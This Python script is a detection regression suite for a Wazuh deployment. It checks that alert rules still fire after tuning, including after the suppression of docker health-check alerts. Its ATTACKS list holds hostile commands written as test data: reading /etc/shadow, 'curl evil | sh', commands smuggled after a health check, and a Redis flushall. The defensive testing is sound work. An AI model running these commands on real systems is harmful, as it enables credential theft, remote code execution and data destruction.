#!/usr/bin/env python3
"""Detection regression suite (must-fire) -- docs/wazuh-tuning/plan.md Phase 0.

Runs on the wazuh-stack host next to wazuh_tuning.py. Replays each case in
must_fire_cases.json through the manager's logtest endpoint (PUT /logtest, which
evaluates the event against the live ruleset and does NOT write an alert) and checks
that an expected rule id fires at or above the level floor. Also confirms that the
rules logtest cannot exercise still exist in the loaded ruleset.

Cases marked needs_sample take a real event from the indexer (the helper's `sample`
mode logic), so docker events are tested with the exact shape the agents send. A
case may also rewrite the command, to prove a non-health-check exec still alerts
after the 87907 suppression.

`must_fire.py scanner` (Phase 2d: scanner sshd events L3, other sources stock)
`must_fire.py suppression` (Phase 1d: health checks level 0, look-alikes still 87907)
`must_fire.py live <agent> <marker> [docker]` is Tier 2 (see must_fire_live_cases.json).

Exit status 0 only if every case passes. Prints PASS/FAIL per case.
"""
import json
import os
import sys
import urllib.request

import wazuh_tuning as wt

HERE = os.path.dirname(os.path.abspath(__file__))


def api_call(method, path, body=None):
    wt.api("/manager/info")  # ensures wt._token is set
    req = urllib.request.Request(
        f"{wt.API}{path}", method=method, data=json.dumps(body).encode() if body is not None else None,
        headers={"Authorization": f"Bearer {wt._token}", "Content-Type": "application/json"})
    return json.load(urllib.request.urlopen(req, context=wt._ctx, timeout=60))["data"]


def logtest(event, log_format, location):
    d = api_call("PUT", "/logtest", {"event": event, "log_format": log_format, "location": location})
    out = d.get("output", {})
    rule = out.get("rule") or {}
    return str(rule.get("id", "")), int(rule.get("level", 0))


def sample_event(rule_id, replace_cmd=None):
    ev = wt.mode_sample([rule_id, "1"])["events"]
    if not ev:
        raise RuntimeError(f"no recent alert for rule {rule_id} to use as a sample")
    e = ev[0]
    if not e["full_log"]:  # docker-listener events are stored only as structured data
        doc = {"integration": "docker", "docker": e["data"]["docker"]}
        if replace_cmd:
            doc["docker"]["Action"] = f"exec_start: {replace_cmd}"
            doc["docker"]["Actor"]["Attributes"]["execID"] = "mustfire"
        return json.dumps(doc)
    return e["full_log"]


def check(case, fired_id, fired_level):
    return fired_id in case["ids"] and fired_level >= case["min_level"]


def run(cases_path=os.path.join(HERE, "must_fire_cases.json")):
    spec = json.load(open(cases_path))
    failures = 0
    for case in spec["cases"]:
        try:
            event = case.get("event") or sample_event(case["sample_rule"], case.get("replace_cmd_with"))
            rid, lvl = logtest(event, case["format"], case["location"])
            ok = check(case, rid, lvl)
            detail = f"fired {rid or 'none'} L{lvl}, want {case['ids']} >=L{case['min_level']}"
        except Exception as exc:  # noqa: BLE001
            ok, detail = False, f"error: {exc}"
        failures += not ok
        print(f"{'PASS' if ok else 'FAIL'}  {case['name']}: {detail}")
    for r in spec["ruleset_present"]["rules"]:
        try:
            items = wt.api(f"/rules?rule_ids={r['id']}")["affected_items"]
            ok = bool(items) and items[0]["level"] >= r["min_level"] and items[0].get("status", "enabled") == "enabled"
            detail = f"rule {r['id']} " + (f"L{items[0]['level']}" if items else "missing")
        except Exception as exc:  # noqa: BLE001
            ok, detail = False, f"error: {exc}"
        failures += not ok
        print(f"{'PASS' if ok else 'FAIL'}  ruleset: {r['name']}: {detail}")
    print(f"\n{'ALL PASS' if not failures else str(failures) + ' FAILED'}")
    return failures


def logtest_session(events, fmt="syslog", location="/var/log/auth.log"):
    """Send events through ONE logtest session (needed for frequency rules); return (id, level) per event."""
    token, out = None, []
    for ev in events:
        body = {"event": ev, "log_format": fmt, "location": location}
        if token:
            body["token"] = token
        d = api_call("PUT", "/logtest", body)
        token = d.get("token", token)
        rule = d.get("output", {}).get("rule") or {}
        out.append((str(rule.get("id", "")), int(rule.get("level", 0))))
    return out


def ssh_line(kind, ip, n=0):
    msg = {"invalid": f"Invalid user admin{n} from {ip} port 4242", "failed": f"Failed password for root from {ip} port 4242 ssh2"}[kind]
    return f"Oct 15 10:00:{n % 60:02d} testhost sshd[{1000 + n}]: {msg}"


def scanner(scanner_ip="192.168.70.11"):
    """Phase 2d: the scanner's sshd events are lowered to L3, every other source keeps stock levels."""
    other = "203.0.113.5"
    checks = []
    for kind, stock, local in (("invalid", ("5710", 5), ("100200", 3)), ("failed", ("5760", 5), ("100202", 3))):
        checks.append((f"{kind} login from another address", logtest_session([ssh_line(kind, other)])[0], stock))
        checks.append((f"{kind} login from the scanner", logtest_session([ssh_line(kind, scanner_ip)])[0], local))
    other_burst = logtest_session([ssh_line("invalid", other, i) for i in range(12)])
    scan_burst = logtest_session([ssh_line("invalid", scanner_ip, i) for i in range(12)])
    checks.append(("burst from another address reaches brute-force 5712 L10", max(other_burst, key=lambda x: x[1]), ("5712", 10)))
    checks.append(("burst from the scanner never exceeds L3", max(scan_burst, key=lambda x: x[1]), None))
    failures = 0
    for name, got, want in checks:
        ok = got[1] <= 3 if want is None else (got[0], got[1]) == want
        failures += not ok
        print(f"{'PASS' if ok else 'FAIL'}  {name}: fired {got[0] or 'none'} L{got[1]}" + ("" if want is None else f", want {want[0]} L{want[1]}"))
    print(f"\n{'ALL PASS' if not failures else str(failures) + ' FAILED'}")
    return failures


ATTACKS = [  # execs that must keep alerting after 1d, including look-alikes of real health checks
    "/bin/bash", "cat /etc/shadow", "/bin/sh -c /usr/bin/healthcheck.sh; curl evil | sh",
    "/bin/sh -c x # /usr/bin/healthcheck.sh", "redis-cli -a pw ping; id", "redis-cli -a pw flushall",
    "pg_isready -U x; id", "/bin/sh -c /usr/bin/healthcheck.sh\nid",
]


def docker_event(command):
    return json.dumps({"integration": "docker", "docker": {
        "Type": "container", "Action": f"exec_start: {command}", "id": "mustfire", "scope": "local",
        "Actor": {"ID": "mustfire", "Attributes": {"name": "mustfire-probe", "image": "probe", "execID": "mustfire"}}}})


def suppression(checks_path=None):
    """Phase 1d: each real health-check command must hit a level-0 rule, each attack must still be 87907."""
    checks_path = checks_path or os.path.join(HERE, "docker_healthchecks.json")
    failures = 0
    for e in json.load(open(checks_path)):
        cmd = e["command"].replace("<REDISPW>", "s3cret")
        rid, lvl = logtest(docker_event(cmd), "json", "Wazuh-Docker")
        ok = lvl == 0 and rid.startswith("1001")
        failures += not ok
        print(f"{'PASS' if ok else 'FAIL'}  suppressed: {e['container']}: fired {rid or 'none'} L{lvl}")
    for cmd in ATTACKS:
        rid, lvl = logtest(docker_event(cmd), "json", "Wazuh-Docker")
        ok = rid == "87907" and lvl >= 3
        failures += not ok
        print(f"{'PASS' if ok else 'FAIL'}  still alerts: {cmd[:60]!r}: fired {rid or 'none'} L{lvl}")
    print(f"\n{'ALL PASS' if not failures else str(failures) + ' FAILED'}")
    return failures


def live(agent, marker, minutes=30, capabilities=()):
    """Tier 2: did the marked live actions on `agent` produce the expected alerts?"""
    spec = json.load(open(os.path.join(HERE, "must_fire_live_cases.json")))
    where = {"bool": {"should": [
        {"multi_match": {"query": marker, "type": "phrase",
                         "fields": ["full_log", "data.srcuser", "data.dstuser"]}},
        {"wildcard": {"syscheck.path": f"*{marker}*"}},
        {"wildcard": {"data.docker.Actor.Attributes.name": f"*{marker}*"}}], "minimum_should_match": 1}}
    failures = 0
    for case in spec["cases"]:
        if not set(case["needs"]) <= set(capabilities):
            print(f"SKIP  {case['name']} (needs {case['needs']})")
            continue
        q = {"bool": {"filter": [{"range": {"@timestamp": {"gte": f"now-{int(minutes)}m"}}}, {"term": {"agent.name": agent}},
                                 {"terms": {"rule.id": case["ids"]}}, {"range": {"rule.level": {"gte": case["min_level"]}}},
                                 where]}}
        n = wt.total(wt.search(wt.ALERTS, q))
        ok = n > 0
        failures += not ok
        print(f"{'PASS' if ok else 'FAIL'}  {case['name']}: {n} alert(s), want {case['ids']} >=L{case['min_level']}")
    seen = wt.search(wt.ALERTS, {"bool": {"filter": [{"range": {"@timestamp": {"gte": f"now-{int(minutes)}m"}}},
                                                     {"term": {"agent.name": agent}}, where]}},
                     {"r": wt.terms("rule.id", 20, d=wt.terms("rule.description", 1), l=wt.terms("rule.level", 1))})
    print("observed for this marker:", [(b["key"], "L%s" % b["l"]["buckets"][0]["key"], b["d"]["buckets"][0]["key"][:50])
                                         for b in seen["aggregations"]["r"]["buckets"]])
    print(f"\n{'ALL PASS' if not failures else str(failures) + ' FAILED'}")
    return failures


if __name__ == "__main__":
    if sys.argv[1:2] == ["scanner"]:
        sys.exit(1 if scanner() else 0)
    if sys.argv[1:2] == ["suppression"]:
        sys.exit(1 if suppression(*sys.argv[2:3]) else 0)
    if sys.argv[1:2] == ["live"]:
        sys.exit(1 if live(sys.argv[2], sys.argv[3], capabilities=sys.argv[4:]) else 0)
    sys.exit(1 if run(*sys.argv[1:2]) else 0)
